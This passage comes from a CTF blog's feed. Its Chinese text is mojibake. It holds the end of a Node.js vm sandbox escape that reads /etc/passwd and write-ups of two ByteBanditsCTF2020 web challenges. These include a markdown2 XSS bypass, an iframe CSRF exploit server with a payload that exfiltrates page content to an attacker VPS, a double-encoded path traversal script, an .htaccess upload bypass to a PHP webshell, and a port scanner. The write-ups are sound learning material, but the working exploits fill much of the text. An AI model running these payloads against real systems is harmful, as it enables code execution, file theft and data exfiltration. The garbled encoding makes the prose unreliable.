exception: &#39; + host_exception.toString());        host_constructor = host_exception.constructor.constructor;        host_process = host_constructor(&#39;return this&#39;)().process;  child_process = host_process.mainModule.require(&quot;child_process&quot;);  console.log(child_process.execSync(&quot;cat /etc/passwd&quot;).toString());    }</code></pre><p>è™ç¬¦è¿™é¢˜åˆ™åŸºæœ¬å°±æ˜¯æŒ‰hackimçš„babyjsæ”¹çš„ã€‚å‰ç«¯éƒ½å‡ ä¹ä¸€æ ·ã€‚åªä¸è¿‡vmç‰ˆæœ¬æ¢æˆäº†3.8.3â€¦æ‰€ä»¥æœä¸‹issueå°±è¡Œäº†ã€‚bypassç”¨ä¸Šé¢æ€»ç»“çš„æ–¹æ³•éƒ½å¯ä»¥ã€‚</p><p>å…³äºæ²™ç›’é€ƒé€¸çš„ä¸€äº›ç»†èŠ‚æˆ‘ä¹Ÿæ˜¯ä¸å¤ªæ‡‚ã€‚æ‰“ç®—è¿‡æ®µæ—¶é—´æŠŠå›½é™…èµ›ä¸Šjsæ²™ç›’é€ƒé€¸çš„é¢˜è¡¥ä¸€ä¸‹ã€‚ç›®å‰çš„å¥—è·¯ç®€å•æœ‰ï¼š<br><code>Error().stack</code><br>ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥çˆ†å‡ºstack strace.ç›¸å½“äºæ˜¯ä¸€ä¸ªFUZZæ‰‹æ®µäº†.çˆ†å‡ºé”™è¯¯ä¿¡æ¯å¦‚vm.jsæˆ–è€…vm2.jså°±å¯ä»¥å»æ”¶é›†å¯¹åº”çš„payloadäº†ã€‚</p><p>æ—¥åå†ç¢°åˆ°æ²™ç›’é€ƒé€¸çš„é¢˜ä¹Ÿä¼šæ”¾åˆ°æ–‡ç« é‡Œæ€»ç»“ã€‚å¸Œæœ›è‡ªå·±èƒ½å°½å¿«ä¸Šæ‰‹Node.jså§ã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://xz.aliyun.com/t/7184" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184</a><br><a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank" rel="noopener">https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByteBanditsCTF2020ä¸¤é“WEBå¤ç°</title>
      <link href="2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>è¿™å‘¨æœ«åˆå½“äº†æ³¢å›½é™…èµ›åˆ’æ°´æ‡’ç‹—ã€‚çœ‹äº†å‡ ä¸ªæ¯”èµ›éš¾åº¦å‚å·®ä¸é½ã€‚åªæœ‰bytebanditsçš„éš¾åº¦ç¡®å®é¡¶ã€‚å½“æ—¶çœ‹äº†ä¸‹NotesAppæ²¡åšå‡ºæ¥å°±åˆ’æ°´å»äº†ã€‚æ‰€å¹¸å®˜æ–¹å¾ˆè´´å¿ƒçš„ç»™äº†dockerçš„ç¯å¢ƒã€‚ç°åœ¨æŠŠä¸¤é“WEBå¤ç°ä¸‹,éƒ½æ˜¯å¾ˆæœ‰ä»·å€¼çš„é¢˜ç›®ã€‚</p><a id="more"></a><h2 id="NotesAPP"><a href="#NotesAPP" class="headerlink" title="NotesAPP"></a>NotesAPP</h2><p>è¿™é¢˜å¤ç°çš„è¯æœ‰ä¸€ä¸ªé—®é¢˜,å°±æ˜¯è¦æ”¹ä¸‹æºç ã€‚ä¸€ä¸ªæ˜¯æ”¹botçš„è®¿é—®åœ°å€ã€‚å†ä¸€ä¸ªå°±æ˜¯å› ä¸ºé‡Œé¢ç”¨äº†Googlecaptchakey,æ‰€ä»¥å¾—æ¢ã€‚ä½†æ˜¯æˆ‘ç»™è‡ªå·±çš„vpsç”³è¯·çš„keyæ¢äº†åè¿˜æ˜¯ä¸é¡¶ç”¨ã€‚ç´¢æ€§æŠŠç›¸å…³çš„htmlè·Ÿpythonä»£ç åˆ æ‰äº†,å§‘ä¸”æ˜¯èƒ½åšäº†hhh.</p><p>é¦–å…ˆé¢˜ç›®ç»™äº†æºç ã€‚ç°åœ¨å¯ä»¥åˆ°å®˜æ–¹githubä¸Šçœ‹<a href="https://github.com/ByteBandits/bbctf-2020/tree/master/web/notes" target="_blank" rel="noopener">https://github.com/ByteBandits/bbctf-2020/tree/master/web/notes</a></p><p>ç®€å•å®¡è®¡åé¦–å…ˆæ³¨æ„åˆ°ä¸€ä¸ªmarkdown xss</p><pre><code class="python">@app.route(&quot;/profile&quot;)@login_requireddef profile():    return render_template(&quot;profile.html&quot;, current_user = current_user)@app.route(&quot;/update_notes&quot;, methods=[&quot;POST&quot;])@login_requireddef update_notes():    if current_user.id == &#39;admin&#39;:        return &quot;Nope.&quot;    # markdown support!!    current_user.notes = markdown2.markdown(request.form.get(&#39;notes&#39;), safe_mode = True)    db.session.commit()    return redirect(&quot;/profile&quot;)</code></pre><p>ç™»å½•è¿›å»ååœ¨/profileè·¯ç”±å³å¯updatemarkdownå†…å®¹ã€‚è¿™é‡Œè‡ªç„¶æƒ³åˆ°markdownxssã€‚ä¸è¿‡å½“æ—¶å°è¯•äº†ä¸‹å¹¶æ²¡æœ‰æ‰“å‡ºæ¥ã€‚<br>å› ä¸ºè¿™é‡Œç”¨åˆ°çš„æ˜¯markdown2è¿™ä¸ªåº“çš„safe_modeã€‚htmlæ ‡ç­¾éƒ½ä¼šç›´æ¥è½¬ä¹‰ã€‚<br>åæ¥å‘ç°ç”¨åˆ°çš„æ˜¯githubä¸Šçš„ä¸€ä¸ªissue.<br><a href="https://github.com/trentm/python-markdown2/issues/341" target="_blank" rel="noopener">https://github.com/trentm/python-markdown2/issues/341</a><br>safe_modeæˆ–è€…escapeéƒ½æœ‰å¯¹åº”çš„xsspayload</p><pre><code>&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;alert(1);/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;</code></pre><p><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¾—åˆ°ä¸€ä¸ªself-xss.</p><p>å¾—åˆ°self-xssçš„ç¬¬ä¸€æ­¥å°±æ˜¯åº”è¯¥è€ƒè™‘å¦‚ä½•æå‡xssçš„å±å®³æ€§ã€‚å› ä¸ºæˆ‘ä»¬çš„é¢˜ç›®è¿˜æœ‰ä¸€å¤„<code>/send_link</code>è·¯ç”±æ˜æ˜¾æ˜¯æäº¤urlåè®©botè¿›è¡Œè®¿é—®ã€‚é‚£ä¹ˆè¿™é‡Œå¯èƒ½éœ€è¦è€ƒè™‘csrfã€‚<br>å› ä¸ºåªæœ‰adminç™»å½•è®¿é—®profileä¼šå¾—åˆ°flagã€‚æˆ‘ä»¬è®¿é—®è‡ªå·±çš„profileåªèƒ½å¾—åˆ°è‡ªå·±çš„å†…å®¹ã€‚<br>ä¼ ç»Ÿçš„CSRFä¸€å®šæ˜¯éµå¾ªä»¥ä¸‹åŸåˆ™çš„ï¼š</p><pre><code>1.ç™»å½•å—ä¿¡ä»»ç½‘ç«™Aï¼Œå¹¶åœ¨æœ¬åœ°ç”ŸæˆCookieã€‚2.åœ¨ä¸ç™»å‡ºAçš„æƒ…å†µä¸‹ï¼Œè®¿é—®å±é™©ç½‘ç«™Bã€‚</code></pre><p>é‚£ä¹ˆåŸºäºæ­¤é¢˜botçš„å­˜åœ¨,æˆ‘ä»¬å¤§æ¦‚çš„æµç¨‹æ˜¯ï¼š</p><pre><code>1.è®©botè®¿é—®profile,æ­¤æ—¶å­˜åœ¨flag2.logout3.ç™»å½•æ„é€ å¥½payloadçš„ç”¨æˆ·ï¼Œå¹¶åŠ è½½payload.å¾—åˆ°adminçš„ä¿¡æ¯</code></pre><p>ä½†æ˜¯å­˜åœ¨å‡ ä¸ªç»†èŠ‚ï¼š<br>å¦‚ä½•æ§åˆ¶botç™»å‡ºå¹¶ç™»å½•ï¼Ÿ<br>å¦‚ä½•è®©æˆ‘ä»¬çš„payloadèƒ½å¤Ÿå¾—åˆ°adminé¡µé¢çš„ä¿¡æ¯ï¼Ÿ</p><p>ä»”ç»†è§‚å¯Ÿå‘ç°ä¸€ä¸ªç»†èŠ‚ã€‚å½“æˆ‘ä»¬æ³¨å†Œæ—¶,ç”¨æˆ·åä¸å¯†ç é€šè¿‡postæ–¹å¼è¯·æ±‚ã€‚ä½†æ˜¯å½“æˆ‘ä»¬ç™»å‡ºå†ç™»å½•æ—¶ï¼Œå´æ˜¯é€šè¿‡getè¯·æ±‚è¿›è¡Œç™»å½•ã€‚<br>å› æ­¤å…ˆç™»å‡ºå†ç™»å½•çš„ç»†èŠ‚å°±è§£å†³äº†ã€‚<br>è‡³äºåŠ è½½adminçš„ä¿¡æ¯ï¼Œä½¿ç”¨åˆ°çš„è‡ªç„¶æ˜¯ç»å…¸çš„iframe xss ã€‚åŸæ¥æ€»ç»“CSPæ—¶ç”¨è¿‡ã€‚ç»å…¸çš„åˆ©ç”¨å°±æ˜¯ï¼š<br>ä¸€ä¸ªåŒæºé¡µé¢ï¼Œä¸€ä¸ªæ˜¯CSPä¿æŠ¤çš„flagé¡µé¢Aï¼Œä¸€ä¸ªæ˜¯å­˜åœ¨xssçš„é¡µé¢Bã€‚åªéœ€è¦ä¸€ä¸ªiframeå°±èƒ½çªƒå–åˆ°flag.</p><pre><code class="javascript">var iframe = document.createElement(&#39;iframe&#39;);iframe.src=&quot;Aé¡µé¢&quot;;document.body.appendChild(iframe);setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById(&#39;flag&#39;).innerHTML),1000);</code></pre><p>æ­¤é¢˜å¹¶æ²¡æœ‰å¯¹iframeçš„é™åˆ¶ã€‚è‡ªç„¶æ˜¯å¯è¡Œçš„</p><p>æ‰€ä»¥æ„æ€åæˆ‘ä»¬çš„payloadåº”è¯¥æ˜¯</p><pre><code>1.æäº¤url,è®©botè®¿é—®æˆ‘ä»¬vpsä¸Šçš„å†…å®¹2.å…ˆåŠ è½½ä¸€ä¸ªiframeå»è®¿é—®profileå¹¶ç™»å‡º3.å†åŠ è½½ä¸€ä¸ªiframeï¼Œé€šè¿‡urlç›´æ¥ç™»å½•æˆ‘ä»¬è‡ªå»ºè´¦å·ã€‚è§¦å‘payload</code></pre><p>ç„¶è€Œè¿™é¢˜æœ‰ä¸ªå‘ æ³¨æ„åˆ°visit_link.pyä¸­</p><pre><code class="python">import asynciofrom pyppeteer import launchfrom redis import Redisfrom rq import Queueimport osimport psutil, signalasync def main(url):    browser = await launch(headless=True,                           executablePath=&quot;/usr/bin/chromium-browser&quot;,                           args=[&#39;--no-sandbox&#39;, &#39;--disable-gpu&#39;])    try:        page = await browser.newPage()        await page.goto(&quot;https://notes.web.byteband.it/login&quot;)        await page.type(&quot;input[name=&#39;username&#39;]&quot;, &quot;admin&quot;)        await page.type(&quot;input[name=&#39;password&#39;]&quot;, os.environ.get(&quot;ADMIN_PASS&quot;))        await asyncio.wait([            page.click(&#39;button&#39;),            page.waitForNavigation(),        ])        newPage = await browser.newPage()        await newPage.goto(url)    except Exception as e:        raise e    finally:        await browser.close()def visit_url(url):    asyncio.get_event_loop().run_until_complete(main(url))q = Queue(connection=Redis(host=&#39;redis&#39;))</code></pre><p>è¿™ä¸²å¼‚æ­¥ä»£ç è®©adminåªè¦è®¿é—®äº†åç«‹å³é€€å‡ºã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„payloadå¹¶ä¸ä¼šæœ‰æ—¶é—´è§¦å‘ã€‚</p><p>å› æ­¤éœ€è¦é¢å¤–è®¾è®¡ï¼Œæ¯”å¦‚èµ·ä¸€ä¸ªflaskæ§åˆ¶botè®¿é—®æ—¶è¿›è¡Œåœé¡¿ï¼Œè¿™æ ·å°±æœ‰æ—¶é—´è§¦å‘payloadäº†ã€‚<br>ä¸‹é¢æ˜¯dalaoçš„è„šæœ¬</p><pre><code class="python">#!/usr/bin/env python3import timefrom http.server import BaseHTTPRequestHandler,HTTPServerPORT_NUMBER = 8877SERVER = &quot;https://notes.web.byteband.it&quot;USERNAME = &quot;abc&quot;PASSWORD = &quot;123&quot;EXPLOIT = &quot;&quot;&quot;&lt;html&gt;&lt;body&gt;&lt;script type=&#39;text/javascript&#39;&gt;function loginUser() {{    var iframe = document.createElement('iframe');    iframe.style.display = "none";    iframe.src = "{server}/login?username={username}&password={password}";    iframe.sandbox = "allow-same-origin allow-scripts";    document.body.appendChild(iframe);}};function logoutUser() {{    var iframe = document.createElement('iframe');    iframe.style.display = "none";    iframe.onload = loginUser;    iframe.src = "{server}/logout";    iframe.sandbox = "allow-same-origin allow-scripts";    document.body.appendChild(iframe);}};&lt;/script&gt;&lt;iframe id=&quot;iframe01&quot; name=&quot;iframe01&quot; src=&quot;{server}/profile&quot; sandbox=&quot;allow-same-origin allow-scripts&quot; onload=&quot;logoutUser(this)&quot;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;&quot;&quot;&quot;.format(server=SERVER, username=USERNAME, password=PASSWORD)class MyServer(BaseHTTPRequestHandler):    def do_GET(self):        self.send_response(200)        self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;)        self.end_headers()        self.wfile.write(EXPLOIT.encode(&#39;utf-8&#39;))        time.sleep(10)  # keep open for some time for exploit to finishmyServer = HTTPServer((&quot;0.0.0.0&quot;, PORT_NUMBER), MyServer)print(time.asctime(), &quot;Server Starts - %s:%s&quot; % (&quot;0.0.0.0&quot;, PORT_NUMBER))try:    myServer.serve_forever()except KeyboardInterrupt:    passmyServer.server_close()print(time.asctime(), &quot;Server Stops - %s:%s&quot; % (&quot;0.0.0.0&quot;, PORT_NUMBER))</code></pre><p>ä»è¿™è¡Œä»£ç å°±èƒ½çœ‹å‡ºä¸»è¦æµç¨‹è·Ÿä¹‹å‰æ„æ€çš„æ€è·¯æ˜¯ä¸€è‡´çš„ã€‚<br><code>&lt;iframe id=&quot;iframe01&quot; name=&quot;iframe01&quot; src=&quot;{server}/profile&quot; sandbox=&quot;allow-same-origin allow-scripts&quot; onload=&quot;logoutUser(this)&quot;&gt;&lt;/iframe&gt;</code><br>ä¸»è¦å°±æ˜¯è¦sleep10s.<br>åœ¨vpsä¸Šè¿è¡Œã€‚ç„¶åæˆ‘ä»¬ç”¨è‡ªå·±çš„abcç”¨æˆ·updatepayload</p><pre><code>&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;(new Image).src = &#39;http://vpsip:port/?data=&#39; + escape(parent.frames[&#39;iframe01&#39;].document.body.getElementsByClassName(&quot;hero-body&quot;)[0].innerText);/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;</code></pre><p>èµ·åˆ°çªƒå–iframeå†…å®¹çš„ä½œç”¨,è·å–çš„å†…å®¹æºè‡ªhero-bodyè¿™ä¸ªclassçš„å†…å®¹ã€‚<br>æœ€åurlæäº¤<code>vpsip:port</code>å³å¯<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/flag1.PNG" class="lazyload" data-srcset="flag1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è§£ç å³å¯å‘ç°flag</p><pre><code>Howdy admin!flag{ch41n_tHy_3Xploits_t0_w1n}</code></pre><h2 id="ImgAccess2"><a href="#ImgAccess2" class="headerlink" title="ImgAccess2"></a>ImgAccess2</h2><p>è¿™é¢˜å¾ˆæœ‰è¥å…»ã€‚é¦–å…ˆä¸Šæ¥ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ã€‚æ ¹æ®é¢˜æ„åªèƒ½æ˜¯å›¾ç‰‡,åŒæ—¶ä¸Šä¼ åè¿›å…¥åˆ°uploadè·¯ç”±,å¹¶èƒ½é€šè¿‡<code>/view/md5.../filename</code>è®¿é—®åˆ°è‡ªå·±çš„å›¾ç‰‡</p><p>é‚£ä¹ˆå½“ç„¶è¦è€ƒè™‘æ–‡ä»¶ä¸Šä¼ getshelläº†ã€‚ä½†æ˜¯é¦–å…ˆæ³¨æ„åˆ°,ä»é¢˜ç›®çš„è·¯ç”±ä¸cookieæ˜æ˜¾æé†’æˆ‘ä»¬è¿™æ˜¯pythonèµ·çš„webæœåŠ¡ã€‚ä½†æ˜¯åŒæ—¶è®¿é—®404æ—¶å‡ºç°çš„æ˜¯ç±»ä¼¼apacheçš„404é¡µé¢</p><p>å¹¶ä¸”è·¯å¾„ä¸Šå‡ºç°çš„æ˜¯/view/xxxxè€Œä¸æ˜¯upload/xxxxx,ä¹Ÿå°±æ„å‘³ç€ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å‡ºçœŸæ­£çš„ä¸Šä¼ è·¯å¾„</p><p>å°è¯•upload/xxx/1.jpgå‘ç°è¿”å›404<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä½†æ˜¯å°†uploadæ”¹ä¸ºuploadsæ—¶å‘ç°å¯ä»¥è®¿é—®åˆ°æˆ‘ä»¬çš„ä¸Šä¼ å›¾ç‰‡äº†ã€‚</p><p>å› æ­¤ç¡®å®šï¼ŒçœŸå®çš„ä¸Šä¼ è·¯å¾„æ˜¯uploadsä¸”å¯ä»¥è®¿é—®åˆ°ã€‚<br>æ­¤æ—¶è€ƒè™‘æ˜¯å¦èƒ½åˆ©ç”¨è¿™ä¸ªè·¯å¾„åšäº›æ–‡ç« </p><p>ç›¸å¯¹å®¹æ˜“æƒ³åˆ°çš„åº”è¯¥æ˜¯è·¯å¾„ç©¿è¶Šäº†ï¼Œä½†å°è¯•æ„é€ æ™®é€šè·¯å¾„ç©¿è¶Šå¤±è´¥ã€‚<br>ä¸è¿‡è·¯å¾„ç©¿è¶Šè¿˜æœ‰ä¸€ç§ç›¸å¯¹æ¯”è¾ƒç†Ÿæ‚‰çš„ç»•è¿‡å§¿åŠ¿ã€‚æ¯”å¦‚urlencodeä¸¤æ¬¡çš„è·¯å¾„ç©¿è¶Š,(phpmyadmin4.8.1å°±æ›¾å‡ºç°è¿‡)<br>é‚£ä¹ˆæ­¤å¤„å°è¯•å¯¹è·¯å¾„ç©¿è¶Šè¿›è¡ŒäºŒæ¬¡urlç¼–ç <br><code>../../../../../etc/passwd</code></p><pre><code class="python">import requestsfrom urllib.parse import quote_plus as urlencodeurl=&#39;http://xxxxxxx:7003/uploads/&#39;filepath=&#39;../../../../../../etc/passwd&#39;filepath=urlencode(filepath)filepath=urlencode(filepath)r=requests.get(url+filepath)print(r.text)</code></pre><p>å‘ç°æˆåŠŸè¯»å–äº†/etc/passwd<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ¥ä¸‹æ¥è‚¯å®šæ˜¯æƒ³è¦å¾—åˆ°å…¶ä»–æœ‰ç”¨ä¿¡æ¯äº†ï¼Œæ¯”å¦‚app.pyçš„æºç <br>æƒ³å…ˆè¯»<code>/proc/self/environ</code>,å‘ç°æ²¡å†…å®¹ã€‚ä½†æ˜¯ä¸è¦ç´§ï¼Œæ­¤æ—¶å¿…ç„¶å¯è¡Œçš„æ–¹æ³•æ˜¯åˆ©ç”¨<code>/proc/self/cwd</code>æŒ‡å‘å½“å‰å·¥ä½œç›®å½•çš„ç‰¹æ€§ï¼Œç›´æ¥è¯»å–app.py<br><code>/proc/self/cwd/app.py</code></p><pre><code class="python">from flask import Flask, render_template, request, flash, redirect, send_filefrom urllib.parse import urlparseimport reimport osfrom hashlib import md5import asyncioimport requestsapp = Flask(__name__)app.config[&#39;UPLOAD_FOLDER&#39;] = os.path.join(os.curdir, &quot;uploads&quot;)# app.config[&#39;UPLOAD_FOLDER&#39;] = &quot;/uploads&quot;app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 1*1024*1024app.secret_key = b&#39;_5#y2L&quot;F4Q8z\n\xec]/&#39;ALLOWED_EXTENSIONS = {&#39;png&#39;, &#39;jpg&#39;, &#39;s&#39;}if not os.path.exists(app.config[&#39;UPLOAD_FOLDER&#39;]):    os.mkdir(app.config[&#39;UPLOAD_FOLDER&#39;])def secure_filename(filename):    return re.sub(r&quot;(\.\.|/)&quot;, &quot;&quot;, filename)def allowed_file(filename):    return &#39;.&#39; in filename and \           filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS@app.route(&quot;/&quot;)def index():    return render_template(&quot;home.html&quot;)@app.route(&quot;/upload&quot;, methods=[&quot;POST&quot;])def upload():    caption = request.form[&quot;caption&quot;]    file = request.files[&quot;image&quot;]    if file.filename == &#39;&#39;:        flash(&#39;No selected file&#39;)        return redirect(&quot;/&quot;)    elif not allowed_file(file.filename):        flash(&#39;Please upload images only.&#39;)        return redirect(&quot;/&quot;)    else:        if not request.headers.get(&quot;X-Real-IP&quot;):           ip = request.remote_addr        else:           ip = request.headers.get(&quot;X-Real-IP&quot;)        dirname = md5(ip.encode()).hexdigest()        filename = secure_filename(file.filename)        upload_directory = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname)        if not os.path.exists(upload_directory):            os.mkdir(upload_directory)        upload_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname, filename)        file.save(upload_path)        return render_template(&quot;uploaded.html&quot;, path = os.path.join(dirname, filename))@app.route(&quot;/view/&lt;path:path&gt;&quot;)def view(path):    return render_template(&quot;view.html&quot;, path = path)@app.route(&quot;/uploads/&lt;path:path&gt;&quot;)def uploads(path):    # TODO(noob):    # zevtnax told me use apache for static files. I&#39;ve    # already configured it to serve /uploads_apache but it    # still needs testing. I&#39;m a security noob anyways.    return send_file(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], path))if __name__ == &quot;__main__&quot;:    app.run(port=5000)</code></pre><p>å‘ç°å‡ ä¸ªä¿¡æ¯ã€‚é¦–å…ˆæ˜¯uploadsè·¯ç”±é‡Œå­˜åœ¨æ˜æ˜¾çš„æç¤ºã€‚æš—ç¤ºæˆ‘ä»¬/uploads_apache/è·¯å¾„</p><p>ç„¶åæ˜¯æ–‡ä»¶åçš„æ£€æŸ¥ã€‚å¾ˆå¥‡æ€ªçš„æ˜¯æ–‡ä»¶åçš„ç™½åå•é‡Œæœ‰ä¸ªs.ä¹‹åå…ˆè°ƒç”¨<code>allowed_file()</code>è¿›è¡Œæ–‡ä»¶åç¼€æ£€æŸ¥ï¼Œç„¶åè°ƒç”¨<code>secure_filename()</code>è¿›è¡Œæ–‡ä»¶åæ£€æŸ¥<br>ç¬¬ä¸€ä¸ªå‡½æ•°åªæ£€æŸ¥æœ€åä¸€ä¸ª<code>.</code>åçš„åç¼€ã€‚è€Œç¬¬äºŒä¸ªå‡½æ•°å°†<code>..</code>æ›¿æ¢ä¸ºç©º<br>é‚£ä¹ˆè¿™å¿…ç„¶å­˜åœ¨ç»•è¿‡.è”ç³»åˆ°è¿™æ˜¯ä¸€ä¸ªapacheæœåŠ¡å™¨,ä¸”åªå…è®¸å›¾ç‰‡ä¸Šä¼ ã€‚è€ƒè™‘ä¸Šä¼ <code>.htaccess</code>è¿›è¡Œgetshell<br>åŒæ—¶ä¸ºäº†ç»•è¿‡æ–‡ä»¶åï¼Œä½¿ç”¨<code>.htacces..s</code><br>ç¬¬ä¸€ä¸ªå‡½æ•°æ£€æŸ¥æ—¶åˆ¤å®šåç¼€ä¸ºs,åœ¨ç™½åå•å†…ã€‚<br>ç¬¬äºŒä¸ªå‡½æ•°å°†..æ›¿æ¢ä¸ºç©ºï¼ŒæˆåŠŸè¾¾åˆ°ä¸Šä¼ <code>.htaccess</code>çš„æ•ˆæœ</p><p>å†…å®¹<br><code>addtype application/x-httpd-php .jpg</code><br>æˆåŠŸä¸Šä¼ ,ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬getshellã€‚</p><p>getshellåå‘ç°æ²¡æœ‰flag.æ¯”èµ›æ—¶é¢˜ç›®æœ‰æç¤ºflagåœ¨secretserver:1337ã€‚æ‰€ä»¥æ–¹ä¾¿ç›´æ¥ä¸‹æ‰‹ã€‚é¶æœºæ²¡æœ‰curlï¼Œé‚£å°±ç›´æ¥wgetå³å¯ã€‚</p><p>ä¸è¿‡å°±ç®—ä¸çŸ¥é“æç¤ºä¹Ÿå¯ä»¥åšï¼Œå®¹å™¨é‡Œæœ‰python3ï¼Œé‚£å°±è‚¯å®šå¯ä»¥æ¢æµ‹ç«¯å£<br>ä»/etc/hostså¾—çŸ¥ipä¸º192.168.128.2.é‚£å°±é¡ºç€æ¢å§ã€‚<br>ç”¨ä¸Šå¿˜è®°ä»å“ªä½å¤§ä½¬é‚£å«–æ¥çš„è„šæœ¬ï¼Œåšbuuæ—¶ç”¨è¿‡ã€‚</p><pre><code class="python">import socketdef foo():    with open(&#39;active_port.txt&#39;,&#39;at&#39;) as f:        for i in range(65535+1):            ip = &#39;192.168.128.3&#39;            try:                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                s.connect((ip,i))                s.close()                f.writelines(str(i)+&#39;\n&#39;)            except socket.error:                pass        f.close()    passif __name__ == &#39;__main__&#39;:    foo()    print(&#39;ok&#39;)</code></pre><p>ä¹Ÿå¯ä»¥å‘ç°1337ç«¯å£å¼€æ”¾ã€‚<br>å…ˆ<code>wget 192.168.128.3:1337</code>å¾—åˆ°index.html<br>å…¶ä¸­å†…å®¹æç¤ºäº†./flag.txt<br>ç›´æ¥<code>wget 192.168.128.3:1337/flag.txt</code>å³å¯<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/flag0.PNG" class="lazyload" data-srcset="flag0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.sigflag.at/blog/2020/writeup-bytebandits2020-notes-app/" target="_blank" rel="noopener">https://www.sigflag.at/blog/2020/writeup-bytebandits2020-notes-app/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Sniper--åˆå°windowsé¶æœº</title>
      <link href="2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/"/>
      <url>2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/</url>
      
